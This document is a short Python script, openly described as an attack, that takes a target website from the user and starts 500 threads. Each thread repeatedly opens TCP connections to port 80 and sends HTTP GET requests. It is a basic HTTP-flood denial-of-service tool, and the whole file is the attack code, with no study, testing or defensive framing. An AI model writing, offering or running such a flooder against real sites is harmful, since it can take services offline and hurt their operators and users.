import socket
import threading

target = input("Enter the target website: ")
port = 80

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(f'GET /{target} HTTP/1.1\r\n'.encode('ascii'), (target, port))
        s.sendto(f'Host: {target}\r\n\r\n'.encode('ascii'), (target, port))
        s.close()

# Create threads to launch the attack
for _ in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
